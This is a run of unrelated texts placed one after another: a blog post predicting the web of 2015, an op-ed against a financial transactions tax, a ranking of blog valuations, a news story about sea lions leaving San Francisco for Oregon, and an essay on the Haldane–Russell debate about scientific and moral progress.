Beyond real - time , search will need to integrate much more with outside sources , new operating systems and the work out the best way to catalogue and express the ever expanding online data and how it is created and used .
HTML 5 is on its way too , this will be a major improvement but it wont be the last the web sees pre 2015 .
By 2015 I believe that the “ internet ” as we know it , a vast linked store of webpages will be a very different beast .
Microsoft ( XBOX ) , Apple ( iPhone ) , Sony ( Ps3 ) – these are all well known , global brands and they are all investing / operating in the new world of applications .
Pioneered by Apple and the iphone the idea of segmented approved tools that are properly ordered was a ( very apple ) genius idea .
Bringing a ( standard ) apple simplicity to what was previously a confusing and avoided world of software for a lot of people .
Microsoft , Sky , Sony and other huge technology developers did not miss this success .
In the coming years slowly these companies will target specific software / hardware at every possible market audience .
By 2015 every member of your family will be buying something digital .
Expanding on the segmented digitally providable media of the iphone app , television programs , games , music , films and books will all be available at the click of a button , tap of a screen or utterance of a command ( and payment systems such as xbox subscriptions and ps3 accounts will remove the actual money part of the transaction further accelerating digital sales . )
This new availability of media will be supported by webpages , but the web - pages are much more likely to be totally interactive , 3d integration is already in browsers but we will see more of this as well as individualised experiences .
Imagine every web - page you accessed could ( based on rules of privacy ) know your name , interests etc – the web could be a much more interactive environment .
By 2015 though I think the web could be on its way to new pastures , gone with the current ideal of “ pages ” accessed by address .
An OS with search integrally built in could remove the requirement for a browser , content could be constructed on the fly and applications / services / movies / experiences could replace pages as we know them , with the situation that web pages changing from a square , box of a screen to a multi surface vivid world that we live in , there is no doubt in my mind that the OS and the web “ page ” as we know it will adapt to a new medium .
We are living in a time which is the true beginning of technology adoption , 2015 might bring a few or all of my predictions into reality , it could just as likely bring thousands more .
Social adoption will drive these things forward and in return the technology will hopefully create a more co-operative , fair and equal world society .
' Do n't tax you , do n't tax me , tax that fellow behind the tree . "
Those famous words were spoken more than 30 years ago by the late Louisiana Sen.
Russel B. Long when Congress was looking for ways to raise revenue .
Some members of Congress believe they 've found the fellow behind the tree : the Wall Street " speculator . "
A small increase in trading costs would , according to supporters , be a manageable burden , and one borne by the speculators who the bill 's authors apparently believe ( to judge by the bill 's name ) created the financial mess .
Across the pond , Prime Minister Gordon Brown of Britain has supported the idea as a way to take the burden off taxpayers during a time of financial crisis .
In reality , the tax would deal a poorly - timed blow to long - term investors everywhere .
Proponents of a transactions tax misunderstand the way markets work .
The bubble in home prices in the United States was not caused by the rapid buying and selling of individual family homes .
The financial crisis was primarily a liquidity crisis and a credit crunch , and the major problem with collateralized mortgage - backed bonds was that they declined significantly in value and became illiquid .
A transactions tax that would have reduced trading and made repurchase agreements more costly , could have made the problem even worse .
The Twenty - Five Most Valuable Blogs In America
It has been nearly a year since 24/7 Wall St. did its latest edition of the Twenty Five Most Valuable Blogs .
Valuations have moved up significantly since then .
Advertising CPMs have improved markedly since the beginning of this year .
A number of the largest blogs on our list have larger audiences than they did a year ago .
All of the blogs analyzed here are private companies .
Blogs owned by larger firms are not measured .
Blogs used primarily as fronts for other businesses have also been excluded .
Some of the blogs on the list have raised VC money and those sums can be used as guidelines if they are disclosed .
The only worthwhile value is what an acquirer will pay , so any estimate needs to take into account the value the blog may have to an outside buyer .
Several blogs from earlier versions of this list were sold , among them Ars Technica and PaidContent .
Some of the largest blogs based on audience measurements do not have significant revenue and are also excluded .
For instance , “ The Daily Beast ” , a large news commentary site controlled by IACI , takes almost no advertising .
In theory , it has little if any economic value at all .
Because of the recovering economy , 24/7 Wall St. has moved up the multiples that it assigned to blog revenue and operating profits , when there are any , by about 45 % from our last list .
Several large public companies in the media sector have stock prices that have doubled since their March lows .
The prices being paid for online media properties are almost certainly rising .
To determine value , 24/7 Wall St. looked at unique visitor and page view information from several public sources including Alexa , Quantcast , Compete , and comScore .
These services are often criticized for estimating website traffic too low and we have taken that into account to the extent possible .
We also looked at audience measurements provided by the blogs themselves when it seemed credible .
Our estimated CPMs for ads are based on the current display and text ad environment , the quality of ads at each blog , and the number of ads that it runs on the average page .
The CPM value assigned to each blog is based on all the ads it runs on its typical pages .
To determine margins , 24/7 looked at headcount when available , and estimated costs of operating and maintaining websites .
More complex content platforms were assigned higher monthly costs .
Current audience growth rates were taken into account .
A site which has traffic doubling year - over - year was given a higher multiple than one which is losing traffic .
Because not all blogs make money , multiples of revenue and operating income were used to assess value .
24/7 used its estimate for revenue over the last three months and annualized the figure to derive an annual revenue and expense figure .
Large blogs with big “ moats ” got higher multiple that smaller ones .
Recreating Huffington Post or TechCrunch would be extremely difficult , even in a moderately good economy .
Blogs with one founder who does most of the writing were given lower multiple because the presence of that single person is essential to the company ’s value .
Finally , blogs which have operated for a long time or have recently received funding received higher valuations because they are more likely to survive .
1. Gawker Properties , $ 300 million .
This group of blogs which includes Gawker , Deadspin , Gizmodo , and Lifehacker has about 23 million monthly unique visitors and 250 million page views .
Owner Nick Denton has pointed out the business is highly profitable and growing and that advertising revenue has performed better than expected .
Almost all the advertising at the family of websites is premium marketing from major companies .
The average CPM on a page is estimated to be $ 20 .
That would drive $ 60 million in annual revenue .
Gawker is not expensive to run .
Its writers are paid relatively low wages .
Many of the blogs Gawker owns have only five or ten writers and editors .
Gawker keeps at least 50 % of its revenue as operating income .
The valuation is based on 10 x operating income .
2. The Huffington Post , $ 112 million .
The Huffington Post is ranked first among all blogs on the Technorati 100 , which means it has a huge number of websites linking to it .
Quantcast puts its global unique visitor audience at 20 million .
The site is set up to encourage navigation from page to page and uses editor slide shows to build page views which are probably about seven per visitor .
Huffington advertisers are a mix of high and middle CPM marketers .
Average CPM per page is about $ 10 .
The company ’s annual revenue run rate should be up to $ 16 million .
Huffington executives say that the company does not make money .
Huffington ’s prestige and its strategic value to a buyer make it extremely valuable .
The 24/7 figure is based on seven times revenue , a much larger - than - normal premium for a media property .
3. Perez Hilton , $ 44 million .
The entertainment and gossip site have over 7 million unique visitors .
24/7 estimates twelve page views per visitor .
The site carries very little premium advertising although its text link ads probably do well .
CPM per page is $ 6 .
The site has revenue of about $ 6.2 million a year .
Perez Hilton has very little staff and appears to have very low operating costs .
The company ’s margin should be 60 % .
This site would be very valuable to a large media company with online entertainment content .
4. Drudge Report . $ 42 million .
Most measurements of the blog show that traffic trends are flat to down .
The site has about nine million unique visitors .
Page view estimates published by Drudge are absurdly high .
The site carries a very modest amount of premium advertising and it is unlikely that the CPM per page is above $ 5 .
Revenue is about $ 8 million .
Drudge appears to have very low staff levels and extremely small operating costs .
Operating income should be about $ 6 million .
5. TechCrunch . $ 32 million .
The sites that make up TechCrunch have almost 4 million unique visitors and the network has about eighteen million page views .
CPMs are very high due to the quality and number of advertisers .
24/7 Wall St. estimates them to be $ 35 per page .
Advertising revenue is about $ 7.5 million .
Other related businesses bring in another $ 2 million .
TechCrunch has a staff of about thirty .
Company margins are about 30 % , or just less than $ 3 million .
6. PopSugar Properties . $ 26 million .
The Sugar Network has 11 million unique visitors to its site which include PopSugar , FitSugar , GeekSuger , and SavvySugar .
The visitors to the sites are young and predominantly female .
The quality of the advertising is low and the sites probably do not get a CPM per page of much more than $ 6 .
The company has revenue of about $ 7.5 million a year .
The sites have a very large staff , probably more than 60 people .
Operating profits are no better than 25 % of revenue , or $ 2 million .
This company would have tremendous value to a media company that targets young women .
7. Politico . $ 23 million .
The site is the largest single media property in the US devoted exclusively to national politics .
It has more than 5 million unique visitors and 40 million page views a month .
Politico needs a better sales operation .
It carries a number of high quality advertisers from corporate image and policy marketers mixed with a number of very low CPM campaigns .
Advertising CPM per page is $ 10 .
Politico has a great deal of value to a national news organization .
It does , however , have very high costs and employs at least 80 people .
Politico loses $ 5 million a year on $ 5 million in revenue .
8. MacRumors . $ 20 million .
MacRumors has 6.5 million unique visitors per month and 45 million page views .
The quality of the advertising is weak .
The company ’s revenue is about $ 4.4 million .
MacRumors staff is small and the publishing platform the site uses is probably very inexpensive .
MacRumors margins are at least 50 % .
Competition in the “ Apple ” news website business has gotten fierce .
9. Boing Boing .
$ 18 million .
This leading tech and gadget site has 3 million unique visitors a month and probably over twenty - four million page views .
CPMs should be relatively high – $ 14 .
Boing Boing has revenue of $ 4 million .
The company has thirty or more people so its margins are probably only 50 % .
10 . Mashable .
$ 17.5 million .
This is the top blog in the country that concentrates on social media .
It has 4.2 million unique visitors a month .
Mashable employees about thirty people .
The site has 30 million page views a month .
Some of the advertising is from the tech industry and should carry high CPMS , but a fair amount of the inventory is sold to more generic marketers .
Total CPM per page is $ 12 .
Total revenue for Mashable is $ 4.3 million .
The site is in a highly competitive part of the blog market and is not the leading site in size or reputation .
Margins are about 45 % .
11 . Seeking Alpha . $ 16 million .
Seeking Alpha , the financial content aggregation site , is now nearly as large as some major media websites like SmartMoney and FT.com .
The site has 2.5 million unique visitors and 18 million page views .
Revenue is $ 3.5 million a year because of the high quality of the financial advertisers that the site runs .
The company has a large staff in Israel and the US .
Seeking Alpha has a complex publishing structure .
The company makes a very small operating profit .
It would be very valuable property for a large media conglomerate that has business and financial websites .

The question on everyone 's mind lately has been :
Where have San Francisco 's famous sea lions gone ?
The answer might lie about 500 miles north of the Golden Gate , where an estimated 2,000 sea lions have recently arrived off the central Oregon coast .
" We 've seen these huge pods out on the ocean - 200 , 300 yards across - altogether a couple thousand sea lions , " said Steve Saubert , co-owner of Sea Lion Caves , a private preserve near the town of Florence .
" They were just here all of a sudden . "
About 500 of those sea lions have moved into the caves themselves , about 300 of them in the past week , said Jim McMillan , an assistant manager at the park .
There would be even more , Saubert said , but the 2 - acre floor space of the cave limits the landing area .
Saubert , 66 , who has been tracking marine wildlife and seabirds on the Oregon coast for most of his life , said that California sea lions , Steller sea lions , pelicans and other marine birds have been attracted to the area by an influx of cold water - 51 degrees the other day - and food , including herring , anchovies , smelt and squid .
He believes this summer 's El Niño event along the California coast pushed the food north and the wildlife followed .
That would coincide with the severe lack of herring in San Francisco Bay and along the Northern California coast , a population that usually peaks in January and February .
Experts believe that has everything to do with the disappearance of sea lions from the bay and most notably from San Francisco 's Pier 39 .
On Oct. 23 , the Marine Mammal Center counted a high of 1,701 sea lions at Pier 39 in San Francisco .
On Nov. 21 , volunteers counted 927 .
After Thanksgiving , there were only 20 , and last week , a half dozen .
Kim Suryan , a biologist with the Marine Mammal Institute in Newport , part of Oregon State University , said she 's been tracking the arrival of California sea lions and Steller sea lions at Sea Lion Caves and a haul - out area at nearby Heceta Point since 2005 .
" This year , there 's definitely more animals , probably a couple more thousand , than we 've seen in the past couple years , " Suryan said .
" It 's the talk of the town around here .
A lot of people have noticed all the sea lions . "
Back in California , several other areas have had similar en masse departures .
At Monterey 's Fisherman 's
Wharf , the number of sea lions declined from 500 to 100 in the past two weeks , according to charter fisherman Chris Arcoleo at the wharf .
At the mouth of the Russian River , where 250 to 300 sea lions often congregate , Michaela Daniels , who works at the nearby Jenner Inn , said she did n't see a single sea lion on a hike there this week .
" There 's nothing for them to eat , " she said .
At the Farallones
One location with no apparent change is the Farallon Islands offshore of San Francisco .
" Everything is pretty much normal , " said Mary Jane Schramm of the Gulf of the Farallones National Marine Sanctuary .
She said scientists who work at the Farallones are seeing plenty of sea lions , murres , gulls and other wildlife .
They believe the sea lions there are feeding on shrimp , squid and sardines .
" Sea lions are opportunistic feeders , " Schramm said .
" We 're in an El Niño phase wherein all bets are off and the rules are suspended .
El Niños sometimes induce wildlife with narrow temperature tolerance to shift northward . "
Hippo Lau , a San Francisco fisherman , said the combination of warm water and lack of herring has sent the sea lions north .
" The herring is why the sea lions have been in San Francisco in the first place , " Lau said .
" For 20 years every winter , the commercial herring netters would just take the eggs from the females , then dump the bodies and discard the males with them .
The sea lions would just lounge around and gorge whenever it happened . "
That has stopped this winter , he said .
Without being told large numbers of sea lions had been located in Oregon , Lau theorized the sea lions would be " up farther north , looking for herring .
Part of it is the warmer water . "
Up in Oregon
Sea Lion Caves is 11 miles north of Florence on the central Oregon coast .
It is a cavern where tide waters enter its floor .
Marine mammals and shorebirds use it as a resting area and for protection from storms and rough seas .
Outside the cave is Lost Beach , near Heceta Point ( named after explorer Bruno Heceta ) , which is not accessible by vehicle and provides an overflow resting area for sea lions when the cave is full .
Saubert said sea lions started arriving in large numbers in late October and the procession of arrivals never stopped .
He sighted 40 brown pelicans a week ago , he said , and that " is real unusual for January here . "
They too follow the food , he said .
The abundant sea lion population in this area has created a micro-ecosystem where wildlife flourishes , Saubert said .
" What I think is happening is the sea lions follow the food supply , " Saubert said .
" Now we have all these sea lions here .
They eat fish and their waste goes to the bottom .
That fertilizes the marine food chain .
You get plankton and brine shrimp , and that brings in the small fish and the whales .
The small fish bring in the seabirds and the bigger fish .
So the sea lions have plenty to eat and the cycle starts over again . "
Upwelling , a trigger for the marine food chain set off by winds out of the northwest , is often significant here .
The missing sea lions of San Francisco , Monterey and the Sonoma coast did not end up in Humboldt or Del Norte counties on California 's north coast , said Bob Farrell , a marine lieutenant for the Department of Fish and Game based in Eureka , adding credence to the theory that they continued moving north .
They 're welcome
Wherever they land , they will most likely be welcomed .
Sea lions are charismatic animals that often seem to behave like big dogs .
Their expressions and behavior have turned them into a huge tourist attraction at San Francisco 's Pier 39 and their disappearance alarmed many .
The hope is that they will return when water temperatures return to normal , bringing the herring and other cold - water fish back , as well .
The organization Tagging of Pacific Pelagics , better known as TOPP Census ( www.topp.org), tags and tracks the ocean migration of several species , including sharks , albatross and sea turtles , but has not tagged a sea lion for study this winter season .
" The sea lions are not tagged and tracked , " said Jim Oswald at the Marine Mammal Center .
" All we can guess , their goal at the core , is to find food . "
Daedalus and Icarus Revisited
Charles T. Rubin
Doubts about the goodness of scientific and technological progress are hardly new , and fears about the dangers of human knowledge existed long before it became plausible to worry that the fate of the entire world might be in peril .
The physicist Freeman Dyson offers one common — and very modern — way of describing our predicament : “ Progress of science is destined to bring enormous confusion and misery to mankind unless it is accompanied by progress in ethics . ”
In other words , we need some novel ethic to match our technological ingenuity .
But progress in ethics might also mean what Abraham Lincoln had in mind when describing the principles of the Declaration of Independence as “ a standard maxim for free society ... constantly looked to , constantly labored for , and even though never perfectly attained , constantly approximated . ”
Dyson ’s idea suggests new ideals replacing old ones as history moves technologically forward ; Lincoln ’s idea suggests more permanent human aspirations that serve as the measure of different ages .
Either meaning poses very serious challenges .
Genuinely novel ethics are not always genuine improvements , while many anciently articulated ethical goals remain elusive .
The ambiguity in the meaning of moral progress is at the heart of a 1923 debate between biochemist J. B. S. Haldane and logician Bertrand Russell , two of the greatest and most argumentative public intellectuals of twentieth - century Britain .
Haldane , who would go on to an extremely distinguished career as a biochemist and geneticist , spoke under the auspices of the Cambridge Heretics discussion club .
Russell , already a famous philosopher , answered him as part of a speakers series sponsored by the Fabian Society under the general title , “ Is Civilization Decaying ? ”
The published version of Haldane ’s remarks created no little controversy ; even Albert Einstein had a copy in his library .
There is also little question that Haldane ’s work influenced two of the greatest British critics of scientific and technological progress : Julian Huxley and C. S. Lewis .
The titles of the essays , Haldane using Daedalus and Russell Icarus , support the common idea that Haldane writes as an advocate of progress and Russell as a skeptic .
While this view is understandable , it is hardly exhaustive .
Haldane freely highlights horrible possibilities for the future , and he is quite blunt about the socially problematic character of scientific research and scientists .
Russell , on the other hand , can imagine circumstances ( albeit unlikely ones ) where the power of science could be ethically or socially constrained .
The real argument is about the meaning of and prospects for moral progress , a debate as relevant today as it was then .
Haldane believed that morality must ( and will ) adapt to novel material conditions of life by developing novel ideals .
Russell feared for the future because he doubted the ability of human beings to generate sufficient “ kindliness ” to employ the great powers unleashed by modern science to socially good ends .
Both authors explore the problem of relating moral and technological progress with sufficient depth that we would benefit by reexamining this debate with a view to our own time .
But the manner in which they frame the problem stands in the way of articulating a clear moral goal that might serve as progress ’s purpose and judge .
With serious ethical discussion thus sidelined , technological change itself becomes the fundamental imperative , despite the reasonable doubts both Haldane and Russell have concerning its ultimate consequences .
And while Haldane is more loath to acknowledge it than Russell , the net result of their debate is a tragic view of mankind ’s future , marked by an irreconcilable and destructive mismatch between our aspiration to understand nature and the power we gain from that knowledge .
In the Image of Science
Haldane begins Daedalus with a directness that does not characterize most of the essay that follows .
Drawing on scenes of destruction from World War I and from casual discussion of the possible reasons for exploding stars , he asks whether the progress of science will culminate in the complete destruction of humanity or in the reduction of human life to an appendage of machines .
“ Perhaps a survey of the present trend of science may throw some light on these questions . ”
It is already revealing that Haldane gives this kind of scientific projection such a privileged place , for it suggests that in his mind the primary question behind the destruction of mankind is simply whether science will gain the power to accomplish it .
If the central issue of our future is the power to destroy ourselves , then the most obvious way of avoiding that risk is preventing mankind from gaining that power in the first place .
Yet Haldane sees no realistic chance of stopping the progress of science .
He argues that believing in the future might strangely require a willingness to see all that we know destroyed and replaced .
Even if we can avert apocalyptic disaster , we will remake ourselves in unrecognizable ways .
Haldane believes that biology is likely to become “ the center of scientific interest ” in the future , and this is where the bulk of his essay is focused .
But he digresses to discuss the situation in physics , which is in a “ state of profound suspense ... primarily due to Einstein , the greatest Jew since Jesus . ”
Avoiding an “ inevitably technical ” discussion of physical theory , he decides instead to speculate on the “ practical consequences of Einstein ’s discovery . ”
In so doing , he provides a preview of the logic that will inform his entire essay .
Einstein heralds the end of the era of Newtonian physics , whose concomitant working metaphysic was materialism .
This scientific revolution means the coming of a new metaphysical and moral order , and Haldane predicts that Einstein ’s work will bring with it a triumph of Kantian idealism ( although he admits that he does not know exactly what this change will mean in practice ) .
He projects further that “ some centuries ” hence “ physiology will invade and destroy mathematical physics . ”
Overall , “ we are working towards a condition when any two persons on earth will be able to be completely present to one another in not more than 1/24 of a second ....
Developments in this direction are tending to bring mankind more and more together , to render life more and more complex , artificial and rich in possibilities — to increase indefinitely man ’s powers for good and evil . ”
This statement is an answer of sorts to the original question :
Will man survive , and what will he be like ?
Haldane ’s answer hardly seems like much of an advance over where the essay began :
Self - destruction , he suggests , is a genuine possibility as we “ increase indefinitely man ’s powers for good and evil . ”
But in fact , Haldane has laid out two crucial elements of his larger argument .
First , there is the implicit definition of progress : bringing mankind closer together , increased complexity , artificiality , and open - endedness .
We will see how this view culminates in his picture of a united humanity working to transcend itself , and in his turn to evolution as a form of salvation .
Second , as Haldane understands the world , scientific discovery brings with it a horizon of belief that sets the parameters of daily life .
While Haldane will speak of “ labor and capital ” as “ our masters , ” his essay attempts to show how it is really the scientists , the Daedaluses of the world , who discover new ways of seeing and doing , and at a far deeper level are in control .
This point is reiterated in yet another digression on “ the decay of certain arts , ” which Haldane describes as a consequence of artists not understanding the scientific and industrial order in which they live .
This view of science ’s role in setting the agenda for human life has crucial consequences for the ethical question that is supposed to be the motive force behind the essay .
If science shapes the parameters of human aspiration and human virtue , then morality is simply an effort to respond to man ’s ever - increasing and ever - changing power over nature .
We judge ourselves in the image of science , not science in the image of some transcendent idea of the human good .
The Malleability of Morals
When the main topic of the essay — advances in biology — is taken up , the subject is again introduced with a digression .
To foretell the impact of future development in biology , Haldane looks at four “ biological inventions of the past ” to see the nature of their consequences .
Three inventions are stated directly : domestication of animals , domestication of plants , and production of alcohol .
A fourth is only hinted at , involving an unspecified invention that focused male sexual attention on the female face and breasts rather than buttocks .
Haldane also mentions the invention of bactericide and birth control .
These biological inventions have two common characteristics .
First , they have had a “ profound emotional and ethical effect ” on human life .
Second , the biological invention “ tends to begin as a perversion and end as a ritual supported by unquestioned beliefs and prejudices . ”
Haldane asks us to consider the “ radical indecency ” that milk drinking introduces into our relationship to the cow , or the “ process of corruption which yields our wine and beer . ”
Any innovator who would suggest such disgusting things would clearly at first be considered outside the bounds of civilization .
But civilization adjusts .
In a typical bit of satire , Haldane wonders what “ strange god will have the hardihood to adopt Charles Bradlaugh and Annie Besant , ” tireless workers for birth control and other secular causes of the nineteenth century .
Haldane takes the figure of Daedalus as instructive about the changing status of beliefs .
Daedalus had no care for the gods , and the gods failed to punish him even for so monstrous an act as breeding a woman with a bull .
“ He was the first to demonstrate that the scientific worker is not concerned with gods , ” and thus he exposed himself to the “ universal and agelong reprobation of humanity ” — with the exception of Socrates , who was “ proud to claim him as an ancestor . ”
The point here is ambiguous .
If there is ongoing disapproval of Daedalus , then Haldane ’s case that mankind adjusts its ideals to its technologies seems questionable .
Yet insofar as the West is heir to Socratic rationalism , it is somehow also heir to Daedalus .
Haldane tries to clarify his argument that yesterday ’s perversions become today ’s “ unquestioned beliefs ” by presenting the bulk of his projections about biology in the form of an essay from “ 150 years hence , ” written by “ a rather stupid undergraduate ” reviewing the progress made in this period .
The student presents the most remarkable achievements — a global food glut , the transformation of the color of the ocean to purple due to the same microorganism that created the food glut , the elimination of deserts , ectogenic children , and genetic engineering — in a deeply matter of fact and unreflective way .
This is his world , and while intellectually he understands it has not always been so , he is reasonably content with the way things are .
Haldane follows this mock essay with his own speculations on birth control , eugenics , behavior control , the abolition of disease and old age , and the transformation of death into “ a physiological event like sleep , ” shorn of its emotional terrors .
In arguing that we adjust our ethics to our inventions , Haldane exploits two truths about human life : over time , many ideas of right and wrong do change in response to changed circumstances , and most people do have a fairly thoughtless understanding of the sources of the ideas of right and wrong that inform their moral horizons .
But Haldane draws too much from these observations , because he fails to connect them in any way .
He neglects to think about the possibility that greater reflection on moral principles might lead to less malleability .
Socrates , after all , proceeded in his investigations by holding open the possibility that opinion could be distinguished from truth , even in moral matters .
For his most ancient examples , the truth of the ethical transformation Haldane describes is so shrouded in myth and mystery that we cannot say anything with certainty .
Haldane does not even attempt to produce evidence of a period of revulsion concerning milk , alcohol , or the female face .
He is on more solid ground with the cases of sanitation and birth control .
But the growing acceptance of both , in the face of what Haldane would see as mere traditionally minded opposition , tells us nothing in and of itself .
We would need to examine , for example , whether opposition to cleanliness was any more or less defensible in its moral claims than opposition to birth control .
Since Haldane does not find it necessary to reflect on this point , he leaves himself open to the charge of holding an unreflective and dogmatic belief in ethical relativism , which from the start transforms all moral claims into cultural prejudices .
Indeed , when Haldane speaks in his own voice about what the future holds , he notes that “ I am Victorian enough in my sympathies to hope that after all family life , for example , may be spared , ” even as it becomes unnecessary for women to bear children .
His only imaginable response to the abolition of the family is rooted in emotions trained by the mores of a particular time and place .
At this point in the essay , it appears that Haldane can provide no assurances that scientific progress will not lead to our demise .
In fact , that demise might be brought on by the way changes wrought by science create new moral desiderata — new norms that adjust our expectations to things that we once saw as evil , blinding us to a self - destructive course .
And even if science does not lead to our demise , a man of the past looking into the future is unlikely to see what he would call “ progress ” strictly speaking ; he is likely instead to see horrifying change and a generation that complacently accepts indecency .
This part of Haldane ’s essay culminates with the observation that the “ conservative has but little to fear from the man whose reason is the servant of his passion , but let him beware of him in whom reason has become the greatest and most terrible of the passions .
These are the wreckers of outworn empires and civilizations , doubters , disintegrators , deicides . ”
This free - spirited view of human affairs might be tolerable if one were confident that something better would be built on the wreckage of the old .
But on Haldane ’s own understanding , as presented so far , no such claim can withstand the fierce gaze of the reasonable man .
So it may come as no surprise that Haldane tries to shift somewhat the ground of his argument .
Might Makes Right
This shift begins with Haldane ’s argument that science should be seen from three points of view : First , it is “ the free activity of man ’s divine faculties of reason and imagination . ”
Second , it is “ the answer of the few to the demands of the many for wealth , comfort and victory . ”
Haldane legitimately reminds us of the bargain on which modern natural science rests , which allows the “ free activity ” of science for the sake of the benefits it produces .
( Of course , if those benefits are inherently double - edged , one might reconsider the terms of the original bargain . )
Third , science is “ man ’s gradual conquest , first of space and time , then of matter as such , then of his own body and those of other living beings , and finally the subjugation of the dark and evil elements of his own soul . ”
These conquests , Haldane acknowledges , will never be complete but they will be “ progressive . ”
And the “ question of what he [ mankind ] will do with these powers is essentially a question for religion and aesthetic . ”
This last point is breathtaking , as Haldane seems to understand .
For what are the “ dark and evil ” aspects of the soul that require conquest ?
Not , apparently , the passion of unadulterated reason ; not the urge to destroy civilizations or commit deicide ; not the urge to murder a rival or satisfy a monstrous lust .
Not , alas , if Daedalus is to remain a model to be admired .
And how do “ religion and aesthetic ” suddenly rise to such a prominent place in shaping man ’s fate , or is their impotence in the face of scientific advance precisely the point ?
For Haldane acknowledges that the scientific powers now being given to mankind are like giving a baby a box of matches ; we seem to possess the power of gods and the wisdom of infants .
How can we expect this all to turn out well ?
In what sense can we call the “ conquest ” of nature and of the human soul “ progressive ” ?
Haldane ’s hope is that “ the tendency of applied science is to magnify injustices until they become too intolerable to be borne , and the average man whom all the prophets and poets could not move , turns at last and extinguishes the evil at its source . ”
But with the impotence of “ religion and aesthetic ” already confirmed , we are left to wonder what Haldane means by injustice , or by what standard “ evil ” will be recognized and judged .
To clarify what he means , Haldane offers the example of war .
By making mankind more powerful , science has created the “ reductio ad absurdum ” of modern warfare , and thus created the circumstances that make world government more possible , since it is the only vehicle that might stop apocalyptic self - destruction .
( He wrote this essay , remember , in the wake of what was then history ’s bloodiest war and at a time when the League of Nations still seemed to hold promise . )
As Haldane puts it : “ Moral progress is so difficult that I think any developments are to be welcomed which present it as the naked alternative to destruction , no matter how horrible may be the stimulus which is necessary before man will take the moral step in question . ”
Our moral future thus depends on flirting with the technological brink , which we seem destined to do whether we like it or not .
Haldane seems to believe that science first pushes society to become more just according to the local standard of justice ( “ the scientific worker is brought up with the moral values of his neighbors ” ) .
But then science , by increasing our power and changing our circumstances , helps to destroy that standard ( “ an alteration of the scale of human power will render actions bad which were formerly good ” ) .
So at the very moment that society is forced to become more just , it is on the way to becoming more “ outworn . ”
When Haldane concludes that the prospect for humanity is “ hopeful if mankind can adjust its morality to its powers , ” he means that progress can only in the most limited sense be seen as the achievement of what was ineffectively advocated by prophets and poets .
His effort to soften his teaching on science ’s power of moral destruction fails ; progress is not the realization of old ideals but the necessary birth of new ones .
“ It is just because even the least dogmatic of religions tends to associate itself with some kind of unalterable moral tradition , that there can be no truce between science and religion . ”
Haldane eventually returns to what is central in his essay : the influence of the man for whom reason has become “ the greatest and most terrible of the passions . ”
The essay concludes with a poetic evocation of “ the lonely figure of Daedalus , ” conscious and proud of his “ ghastly ” mission , “ Singing my song of deicides . ”
From this point of view , moral progress would mean adopting the view that “ mythology and morals are provisional ” or situational — with Daedalus creating the situations .
In effect , Haldane transforms “ might makes right ” into the hallmark of moral progress — an odd but deeply telling conclusion for an essay that has come to be seen as an “ optimistic ” assessment of the future of science .
Why does Haldane fail to appreciate this result ?
One reason is clearly his romantic image of the scientist as a crusader for truth without regard to consequences , and another reason is the need to free the scientist to work unmolested despite all the acknowledged problematic consequences of doing so .
But more deeply , this moral concession to scientific might is perhaps obscured for Haldane by his understanding of the evolving character of scientific power — that is , by his idea of the “ gradual conquest , first of space and time , then of matter as such , then of his own body and other living beings , and finally the subjugation of the dark and evil elements of his own soul . ”
Part of what Haldane has in mind by this growing , but always incomplete , process of conquest is evident both in his look backward at past discoveries and his look forward at future possibilities .
By looking to both past and future , he is attempting to overcome our prosaic acceptance of current abilities , to highlight how remarkable they would look from the perspective of the past , and how we might be similarly impressed ( or naïvely horrified ) by what the future will make possible .
He wants us to be awed by what human beings can achieve through our “ divine faculties of reason and imagination , ” and so to believe in the self - transcending possibility of self - directed evolution .
By realizing the temporary character and utter foreignness of the human past , we might put our faith in a post - human future .
Inventing the Future
This post - human project comes out even more clearly in Haldane ’s story , “ The Last Judgment , ” where he attempts to look forty million years into the future of mankind .
In this vision of the future , man ’s use of tidal power changes the orbit of the moon , drawing it close enough to be destroyed and to destroy all life on Earth .
In the meantime , mankind makes multiple efforts to reach , colonize , and terraform Venus , taking half a million years to achieve the first successful landing .
Realizing the hostile conditions for life on Venus , a group of men set out to restart evolution ; for by then , natural selection had been stopped and mankind had reached a state of happy equilibrium indistinguishable from utter stagnation .
“ Confronted once more with an ideal as high as that of religion but more rational , a task as concrete as but infinitely greater than that of the patriot , man became once more capable of self - transcendence . ”
After only ten thousand years , a genetically engineered offshoot of humanity is created , at odds with its environment , hence driven and unhappy , hence a being that can survive on Venus .
These early settlers develop into a “ superorganism ” of individuals mentally linked to one another , and they prepare a race capable of colonizing the outer planets .
Read in conjunction with Daedalus , the story illustrates Haldane ’s view of the consequences of our increased scientific and technological powers : on the one hand , destroying Earth and all human life , and on the other hand , self - consciously directing human evolution into a form that can thrive elsewhere .
The noble goal of self - transcendence does not produce happiness , but happiness means stagnation .
Haldane was familiar enough with the work of H.G. Wells to anticipate the likely reaction to such a story .
In its own time , it fires the imagination , and hence serves the author ’s purpose : to inspire people to look to the future for guidance rather than the past .
Seen in retrospect , its very quaintness fuels pride in actual accomplishments .
But this way of understanding progress has a troubling side as well , which is well illustrated in British author Olaf Stapledon ’s work Last and First Men , written very much under the influence of Haldane .
The book is a future history covering some two billion years , being dictated to the author by one of the “ last men . ”
During this period , eighteen species of “ men ” — all of them human descendants but few recognizably human — rise and fall , first on Earth , then on Venus , then finally on Neptune .
The Stapledon story , whose early millennia clearly elaborate on “ The Last Judgment , ” is rich in satire and imagination .
Stapledon creates distinctive races of men with their own abilities , physical characteristics , and cultures : men that can fly , men with telepathic powers , men that are nothing more than huge brains .
Civilizations rise and fall due to violence or stagnation ; religions and social movements form on the basis of misunderstandings ; the past is forgotten and rediscovered .
But at a certain point all the races face the necessity or desire for self - transcendence , the inner drive or external push to be more than themselves .
And it is just at this moment that most races destroy themselves — either deliberately via successful evolution of their successors , or unintentionally by unwise use of their scientific powers .
Despite the cyclical character of the story , marked by the rise and fall of different races , there is also a broad progressive tendency in the races ’ increased power over their physical worlds , over their own bodies and minds , and finally over their own pasts .
Some races are happier than others ; some periods of time are more blessed .
But overall , the last men look back at the story and see it as a tragedy .
“ If actual grief has not preponderated over joy , it is because , mercifully , the fulfillment that is wholly missed cannot be conceived . ”
The last men discover that their own end is coming due to the disintegration of the Sun , and they cannot conceive of a way to save themselves .
Instead , they engage in two god - like efforts .
The first is an attempt to redeem the tragic past by “ participation ” in it , exemplified by sending this history back to their ancestors .
( Stapledon does not here trouble himself much with the paradoxes of time travel . )
The last men hope that what they see as signs of providence — signs for which they are not responsible — are evidence of a future intelligence yet greater than their own .
